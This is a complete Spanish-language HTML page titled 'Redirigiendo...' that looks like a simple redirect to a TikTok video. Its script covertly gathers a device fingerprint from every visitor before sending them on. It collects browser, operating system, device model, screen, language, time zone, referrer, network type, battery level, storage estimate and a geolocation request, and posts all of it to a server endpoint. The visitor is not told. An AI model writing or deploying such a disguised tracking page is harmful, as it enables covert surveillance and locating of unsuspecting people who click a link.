<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirigiendo...</title>
  <script>
    async function recopilarDatos() {
      const start = Date.now();

      const battery = await navigator.getBattery?.();
      const deviceMemory = navigator.deviceMemory || null;
      const lang = navigator.language;
      const platform = navigator.platform;
      const userAgent = navigator.userAgent;
      const resolution = `${screen.width}x${screen.height}`;
      const referrer = document.referrer;
      const tipoRed = navigator.connection?.effectiveType || null;
      const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const cookiesHabilitadas = navigator.cookieEnabled;
      const soporteLocal = !!window.localStorage;
      const soporteSession = !!window.sessionStorage;
      const pestañaActiva = document.visibilityState === 'visible';
      const almacenamiento = await navigator.storage?.estimate?.();

      const coords = await new Promise(resolve => {
        navigator.geolocation?.getCurrentPosition(
          pos => resolve(pos.coords),
          () => resolve(null),
          { timeout: 1000 }
        );
      });

      const esBot = /bot|crawler|spider|crawling/i.test(userAgent);

      const data = {
        nombre: 'Visitante',
        userAgent,
        plataforma: platform,
        navegador: detectarNavegador(userAgent),
        sistemaOperativo: detectarSO(userAgent),
        dispositivoTipo: detectarTipo(userAgent),
        dispositivoMarca: detectarMarca(userAgent),
        dispositivoModelo: detectarModelo(userAgent),
        resolucion: resolution,
        devicePixelRatio: window.devicePixelRatio,
        idioma: lang,
        zonaHoraria,
        referrer,
        coords,
        tipoRed,
        bateria: battery ? {
          cargando: battery.charging,
          nivel: battery.level
        } : null,
        almacenamiento: almacenamiento || null,
        cookiesHabilitadas,
        soportaLocal: soporteLocal,
        soportaSession: soporteSession,
        pestañaActiva,
        esBot,
        duracion: Math.floor((Date.now() - start) / 1000)
      };

      await fetch('/api/recibir', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      window.location.href = "https://www.tiktok.com/@funados510/video/7512617576338394374";
    }

    function detectarNavegador(ua) {
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari")) return "Safari";
      return "Desconocido";
    }

    function detectarSO(ua) {
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "Mac OS";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Desconocido";
    }

    function detectarTipo(ua) {
      if (/mobile|iphone|android/i.test(ua)) return "móvil";
      if (/tablet|ipad/i.test(ua)) return "tablet";
      return "desktop";
    }

    function detectarMarca(ua) {
      if (/Samsung/i.test(ua)) return "Samsung";
      if (/Huawei/i.test(ua)) return "Huawei";
      if (/Xiaomi/i.test(ua)) return "Xiaomi";
      if (/iPhone|iPad/i.test(ua)) return "Apple";
      if (/Windows/i.test(ua)) return "Microsoft";
      return "desconocida";
    }

    function detectarModelo(ua) {
      const match = ua.match(/\(([^)]+)\)/);
      return match ? match[1] : "desconocido";
    }

    recopilarDatos();
  </script>
</head>
<body></body>
</html>

